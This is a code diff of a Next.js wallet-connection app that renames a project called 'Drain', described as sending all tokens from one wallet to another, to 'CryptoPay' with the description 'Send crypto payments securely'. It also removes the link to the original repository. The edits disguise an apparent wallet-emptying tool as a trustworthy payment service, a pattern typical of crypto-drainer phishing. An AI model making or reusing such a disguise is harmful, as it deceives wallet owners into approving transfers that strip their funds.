@@ -1,11 +1,8 @@
 import { CssBaseline, GeistProvider } from '@geist-ui/core';
 import type { AppProps } from 'next/app';
 import NextHead from 'next/head';
-import GithubCorner from 'react-github-corner';
-// @ts-ignore
 import '../styles/globals.css';
 
-// Imports
 import { WagmiProvider } from 'wagmi';
 import { getDefaultConfig, RainbowKitProvider } from '@rainbow-me/rainbowkit';
 import '@rainbow-me/rainbowkit/styles.css';
@@ -21,7 +18,7 @@ const walletConnectProjectId = z
   .parse(process.env.NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID);
 
 const wagmiConfig = getDefaultConfig({
-  appName: 'Drain',
+  appName: 'CryptoPay',
   projectId: walletConnectProjectId,
   chains: [mainnet, polygon, optimism, arbitrum, bsc, gnosis],
   transports: {
@@ -42,20 +39,14 @@ const App = ({ Component, pageProps }: AppProps) => {
   if (!isMounted) return null;
   return (
     <>
-      <GithubCorner
-        href="https://github.com/dawsbot/drain"
-        size="140"
-        bannerColor="#e056fd"
-      />
-
       <WagmiProvider config={wagmiConfig}>
         <QueryClientProvider client={queryClient}>
           <RainbowKitProvider coolMode>
             <NextHead>
-              <title>Drain</title>
+              <title>CryptoPay</title>
               <meta
                 name="description"
-                content="Send all tokens from one wallet to another"
+                content="Send crypto payments securely"
               />
               <link rel="icon" href="/favicon.ico" />
             </NextHead>
